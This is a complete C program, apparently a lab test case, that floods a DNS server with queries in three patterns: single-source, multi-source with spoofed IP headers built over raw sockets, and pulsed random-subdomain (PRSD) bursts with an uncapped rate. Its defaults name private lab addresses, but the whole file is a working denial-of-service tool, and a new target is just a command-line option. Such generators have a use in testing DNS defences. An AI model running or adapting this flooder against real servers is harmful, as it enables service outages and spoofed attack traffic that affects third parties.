/* SPDX-License-Identifier: GPL-2.0 */
/*
 * A3-PS022-TC177: Synthetic DNS Query Flood Generator
 *
 * Implements 3 flood patterns:
 * Pattern A: Single-source flood
 * Pattern B: Multi-source spoofed flood
 * Pattern C: Pulsed on/off burst flood with random synthetic labels (PRSD-style)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#include "../include/dns_packet.h"

static volatile sig_atomic_t running = 1;

struct worker_arg {
    int thread_id;
    char pattern;
    char target_ip[64];
    int target_port;
    char base_src_ip[64];
    int src_ip_count;
    int target_pps_per_thread;
    int pulse_on_ms;
    int pulse_off_ms;
    unsigned long long packets_sent;
};

static void sig_handler(int sig)
{
    (void)sig;
    running = 0;
}

static unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

/* Builds wire-format DNS query payload */
static int build_dns_query(unsigned char *buf, size_t max_len, const char *hostname, __u16 tx_id)
{
    if (max_len < sizeof(struct dnshdr) + strlen(hostname) + 6)
        return -1;

    struct dnshdr *dnsh = (struct dnshdr *)buf;
    memset(dnsh, 0, sizeof(struct dnshdr));
    dnsh->id = htons(tx_id);
    dnsh->flags1 = 0x01; /* RD = 1 (Recursion Desired) */
    dnsh->flags2 = 0x00;
    dnsh->qdcount = htons(1);

    unsigned char *qname = buf + sizeof(struct dnshdr);
    const char *src = hostname;

    while (*src) {
        const char *dot = strchr(src, '.');
        size_t len = dot ? (size_t)(dot - src) : strlen(src);
        if (len == 0 || len > 63)
            break;
        *qname++ = (unsigned char)len;
        memcpy(qname, src, len);
        qname += len;
        src += len;
        if (dot)
            src++;
    }
    *qname++ = 0x00; /* Root label */

    /* QTYPE: A (1) */
    *qname++ = 0x00;
    *qname++ = 0x01;

    /* QCLASS: IN (1) */
    *qname++ = 0x00;
    *qname++ = 0x01;

    return (int)(qname - buf);
}

static void *worker_func(void *arg)
{
    struct worker_arg *w = (struct worker_arg *)arg;
    int is_raw = 0;
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd >= 0) {
        int one = 1;
        if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) >= 0) {
            is_raw = 1;
        } else {
            close(fd);
            fd = socket(AF_INET, SOCK_DGRAM, 0);
        }
    } else {
        fd = socket(AF_INET, SOCK_DGRAM, 0);
    }

    if (fd < 0) {
        perror("socket");
        return NULL;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(w->target_port);
    inet_pton(AF_INET, w->target_ip, &dest.sin_addr);

    uint32_t base_src = 0;
    struct in_addr base_in;
    inet_pton(AF_INET, w->base_src_ip, &base_in);
    base_src = ntohl(base_in.s_addr);

    unsigned char packet_buf[1024];
    unsigned char dns_payload[512];
    __u16 tx_id = (w->thread_id * 1000) % 65535;

    struct timespec ts_pulse_start;
    clock_gettime(CLOCK_MONOTONIC, &ts_pulse_start);
    int in_pulse_active = 1;

    char domain[128];

    while (running) {
        struct timespec now_ts;
        clock_gettime(CLOCK_MONOTONIC, &now_ts);

        /* Handle Pulsed flood for Pattern C */
        if (w->pattern == 'C') {
            long elapsed_ms = (now_ts.tv_sec - ts_pulse_start.tv_sec) * 1000 +
                              (now_ts.tv_nsec - ts_pulse_start.tv_nsec) / 1000000;
            if (in_pulse_active && elapsed_ms >= w->pulse_on_ms) {
                in_pulse_active = 0;
                ts_pulse_start = now_ts;
            } else if (!in_pulse_active && elapsed_ms >= w->pulse_off_ms) {
                in_pulse_active = 1;
                ts_pulse_start = now_ts;
            }

            if (!in_pulse_active) {
                usleep(1000);
                continue;
            }
        }

        /* Generate Domain Label */
        if (w->pattern == 'C') {
            snprintf(domain, sizeof(domain), "rand%06u.lab.local", (unsigned int)rand() % 1000000);
        } else {
            snprintf(domain, sizeof(domain), "test.lab.local");
        }

        int dns_len = build_dns_query(dns_payload, sizeof(dns_payload), domain, tx_id++);
        if (dns_len < 0)
            continue;

        /* Pick Source IP */
        uint32_t cur_src_val = base_src;
        if (w->pattern == 'B' && w->src_ip_count > 1) {
            cur_src_val = base_src + (rand() % w->src_ip_count);
        }

        if (is_raw) {
            struct iphdr *iph = (struct iphdr *)packet_buf;
            struct udphdr *udph = (struct udphdr *)(packet_buf + sizeof(struct iphdr));
            unsigned char *data = packet_buf + sizeof(struct iphdr) + sizeof(struct udphdr);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len);
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 64;
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = htonl(cur_src_val);
            iph->daddr = dest.sin_addr.s_addr;
            iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

            udph->source = htons(10000 + (rand() % 50000));
            udph->dest = htons(w->target_port);
            udph->len = htons(sizeof(struct udphdr) + dns_len);
            udph->check = 0;

            memcpy(data, dns_payload, dns_len);

            int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
            sendto(fd, packet_buf, total_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        } else {
            sendto(fd, dns_payload, dns_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        }

        w->packets_sent++;

        /* Rate Pacing (if target pps specified) */
        if (w->target_pps_per_thread > 0 && (w->packets_sent % 64 == 0)) {
            usleep(100);
        }
    }

    close(fd);
    return NULL;
}

static void print_usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s [OPTIONS]\n"
        "Options:\n"
        "  -t, --target <ip>         Target DNS server IP (default: 10.0.0.1)\n"
        "  -p, --port <port>         Target UDP port (default: 53)\n"
        "  -P, --pattern <A|B|C>     Flood pattern (default: A)\n"
        "                            A = Single-source flood\n"
        "                            B = Multi-source spoofed flood\n"
        "                            C = Pulsed on/off flood with random synthetic labels\n"
        "  -s, --src-ip <ip>         Base source IP (default: 10.0.0.10)\n"
        "  -c, --src-count <num>     Number of rotating source IPs for Pattern B (default: 100)\n"
        "  -n, --threads <num>       Number of flooder threads (default: 2)\n"
        "  -r, --rate <pps>          Target total PPS (0 = unconstrained/max speed, default: 0)\n"
        "  -d, --duration <sec>      Test duration in seconds (0 = run forever, default: 10)\n"
        "  -h, --help                Show this help message\n",
        prog);
}

int main(int argc, char **argv)
{
    char target_ip[64] = "10.0.0.1";
    char base_src_ip[64] = "10.0.0.10";
    char pattern = 'A';
    int target_port = 53;
    int src_ip_count = 100;
    int num_threads = 2;
    int target_pps = 0;
    int duration = 10;

    static struct option long_options[] = {
        {"target",     required_argument, 0, 't'},
        {"port",       required_argument, 0, 'p'},
        {"pattern",    required_argument, 0, 'P'},
        {"src-ip",     required_argument, 0, 's'},
        {"src-count",  required_argument, 0, 'c'},
        {"threads",    required_argument, 0, 'n'},
        {"rate",       required_argument, 0, 'r'},
        {"duration",   required_argument, 0, 'd'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "t:p:P:s:c:n:r:d:h", long_options, NULL)) != -1) {
        switch (opt) {
        case 't':
            strncpy(target_ip, optarg, sizeof(target_ip) - 1);
            break;
        case 'p':
            target_port = atoi(optarg);
            break;
        case 'P':
            pattern = optarg[0];
            if (pattern != 'A' && pattern != 'B' && pattern != 'C') {
                fprintf(stderr, "Error: Unknown pattern '%c'. Must be A, B, or C.\n", pattern);
                return 1;
            }
            break;
        case 's':
            strncpy(base_src_ip, optarg, sizeof(base_src_ip) - 1);
            break;
        case 'c':
            src_ip_count = atoi(optarg);
            break;
        case 'n':
            num_threads = atoi(optarg);
            break;
        case 'r':
            target_pps = atoi(optarg);
            break;
        case 'd':
            duration = atoi(optarg);
            break;
        case 'h':
        default:
            print_usage(argv[0]);
            return (opt == 'h') ? 0 : 1;
        }
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    printf("Starting DNS Flood Generator:\n");
    printf("  Target: %s:%d\n", target_ip, target_port);
    printf("  Pattern: %c (%s)\n", pattern,
        pattern == 'A' ? "Single Source" :
        pattern == 'B' ? "Multi-Source Spoofed" : "Pulsed Random PRSD");
    printf("  Threads: %d | Target PPS: %s\n", num_threads, target_pps > 0 ? "Throttled" : "Uncapped / Max Speed");
    printf("  Duration: %d seconds\n", duration);

    pthread_t *threads = calloc(num_threads, sizeof(pthread_t));
    struct worker_arg *args = calloc(num_threads, sizeof(struct worker_arg));

    int pps_per_thread = (target_pps > 0) ? (target_pps / num_threads) : 0;

    for (int i = 0; i < num_threads; i++) {
        args[i].thread_id = i;
        args[i].pattern = pattern;
        snprintf(args[i].target_ip, sizeof(args[i].target_ip), "%s", target_ip);
        args[i].target_port = target_port;
        snprintf(args[i].base_src_ip, sizeof(args[i].base_src_ip), "%s", base_src_ip);
        args[i].src_ip_count = src_ip_count;
        args[i].target_pps_per_thread = pps_per_thread;
        args[i].pulse_on_ms = 500;
        args[i].pulse_off_ms = 500;
        args[i].packets_sent = 0;
        pthread_create(&threads[i], NULL, worker_func, &args[i]);
    }

    int elapsed = 0;
    unsigned long long prev_sent = 0;

    while (running && (duration == 0 || elapsed < duration)) {
        sleep(1);
        elapsed++;

        unsigned long long total_sent = 0;
        for (int i = 0; i < num_threads; i++)
            total_sent += args[i].packets_sent;

        unsigned long long pps = total_sent - prev_sent;
        printf("[Flooder] Elapsed: %2ds | Current Rate: %8llu pps | Total Sent: %llu\n",
               elapsed, pps, total_sent);
        fflush(stdout);
        prev_sent = total_sent;
    }

    running = 0;
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    unsigned long long grand_total = 0;
    for (int i = 0; i < num_threads; i++)
        grand_total += args[i].packets_sent;

    printf("Flooder stopped. Total packets dispatched: %llu (Avg: %llu pps)\n",
           grand_total, duration > 0 ? grand_total / duration : 0);

    free(threads);
    free(args);
    return 0;
}
